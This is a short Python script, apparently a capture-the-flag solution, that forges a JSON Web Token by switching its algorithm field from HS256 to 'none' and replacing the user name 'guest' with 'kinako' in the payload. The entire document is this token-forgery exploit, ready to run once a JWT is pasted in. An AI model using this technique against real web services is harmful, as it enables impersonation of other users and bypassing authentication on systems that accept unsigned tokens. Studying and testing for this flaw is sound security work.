#!/usr/local/bin/python3

import base64 as b64

jwt = "<Please input your JWT>"

header, payload, signature = jwt.split('.')


header = b64.b64encode(b64.b64decode(header).decode('utf-8').replace('HS256', 'none').encode('utf-8'))
payload = b64.b64encode(b64.b64decode(payload + "==").decode('utf-8').replace('guest', 'kinako').encode('utf-8'))
signature = signature.encode('utf-8')

rewrited_jwt = header + b'.' + payload + b'.' + signature

print(rewrited_jwt)